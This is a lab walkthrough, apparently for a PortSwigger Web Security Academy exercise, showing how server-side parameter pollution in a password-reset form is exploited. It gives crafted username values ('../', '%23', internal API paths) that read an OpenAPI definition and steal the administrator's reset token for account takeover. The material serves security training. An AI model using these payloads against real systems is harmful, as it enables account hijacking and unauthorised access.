# [Exploiting server-side parameter pollution in a REST URL](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url)

## exploring app

- open the lab in burp browser
- try to log in as **administrator**
- then reset password
- in **Target** check the `GET` request for `/static/js/forgotPassword.js`
- its response is the `forgotPassword.js` that has a line:

```js
HTTP/2 200 OK
...
forgotPwdReady(() => {
    ...
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
    ...
});
```

- the important part is the `/forgot-password?passwordResetToken=${resetToken}`
- if there is a `passwordResetToken` is available for the **administrator** then giving a new password can hijack the admin

## study behavior

- in **proxy** send the `POST /forgot-password` to the repeater

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administrator
```

- test it again if the `csrf` still valid (it is)
- try to send it with a different username

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administratorx
```

```
HTTP/2 400 Bad Request
...
{
  "type": "error",
  "result": "The provided username \"administratorx\" does not exist"
}
```

- just gives back that the **administratorx** does not exist
- try to comment it: **administrator#**

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administrator%23
```

```
HTTP/2 404 Not Found
...
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

- the server may have placed the input in the path of a server-side request, and the `#` has truncated some trailing data
- try the same request with `?`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administrator%3F
```

```
HTTP/2 404 Not Found
...
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

- same response
- that the input may be placed in a `URL path`, as the `?` character indicates the start of the query string and therefore truncates the `URL path`
- try to add refer to **administrator** as path

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=./administrator
```

- it will return `200`
- this means the **administrator** has been placed in a path
- try to go up a level

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=../administrator
```

```
HTTP/2 404 Not Found
...
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

- the request have accessed an invalid `URL path`

## navigate to the API definition

- change the **administrator** to comment -> `#`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=../%23
```

```
HTTP/2 404 Not Found
...
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

- add further `../` sequences until you reach `500`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=../../../../%23
```

```
HTTP/2 500 Internal Server Error
...
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

- the request navigated outside the API root
- try for `openapi.json`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=../../../../openapi.json%23
```

```
HTTP/2 500 Internal Server Error
...
{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```

- there is the `"/api/internal/v1/users/{username}/field/{field}\"` path where the endpoint called `field`
- lets use it in the original request

## retrieving reset token

- try to use the `field`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administrator/field/duck%23
```

```
HTTP/2 400 Bad Request
...
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```

- only the `email` path supported, lets try that

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administrator/field/email%23
```

- it will respond with the original request
- try with the `passwordResetToken`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=administrator/passwordResetToken/email%23
```

- "only email supported" response again
- try the api endpoint: `"/api/internal/v1/users/{username}/field/{field}\"`

```
POST /forgot-password HTTP/2
...
csrf=some-csrf&username=../../v1/users/administrator/field/passwordResetToken%23
```

- this will give back the reset token

```
HTTP/2 200 OK
...
{
  "type": "passwordResetToken",
  "result": <reset-token>
}
```

- go back to the `/forgot-password` url in the browser and add `/forgot-password?passwordResetToken=<reset-token>` to it
- it should offer a new password option for the **administrator**
- create a new one
- log in
- delete carlos
